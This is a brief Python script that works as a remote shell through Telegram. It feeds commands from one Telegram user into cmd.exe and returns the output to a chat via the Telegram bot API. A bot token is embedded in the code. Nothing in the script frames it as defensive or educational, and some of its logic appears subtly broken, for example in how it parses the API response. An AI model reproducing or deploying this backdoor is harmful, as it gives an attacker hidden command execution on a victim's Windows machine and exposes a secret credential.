import requests
import sys
import os
import json
from datetime import datetime
if len(sys.argv)==1:
    os.system("python cmd.py 0 | cmd.exe |python cmd.py 1")
token="7916790982:AAHfrFvAHSYtCw5Qx6DhmdAGcq2yE6H5yYo"
if sys.argv[1]=="0":
    offset=0
    tstart=(datetime.utcnow() - datetime(1970, 1, 1)).total_seconds()
    while True:
        rq=requests.post(
            f"https://api.telegram.org/bot{token}/getUpdates",
            data={
                "offset": offset,
                "allowed_updates": ["message"]
            }
        )
        #print(rq.text)
        rqj=json.loads(rq.text)
        for i in rqj:
            offset=int(i["update_id"])
            if i["message"]["from"]["username"]!="terryp12":
                #print("PHONY")
                continue
            if i["message"]["date"]<tstart:
                #print("EARLY")
                continue
            print(i["message"]["text"])

rq=requests.post(
    f"https://api.telegram.org/bot{token}/getUpdates",
    data={
        "offset": offset,
        "allowed_updates": ["message"]
    }
)
js=json.loads(rq.text)
cid=int(js[0]["message"]["chat"]["id"])
while True:
    prm=input()
    requests.post(
        f"https://api.telegram.org/bot{token}/sendMessage",
        data={
            "chat_id": cid,
            "text": prm
        }
    )
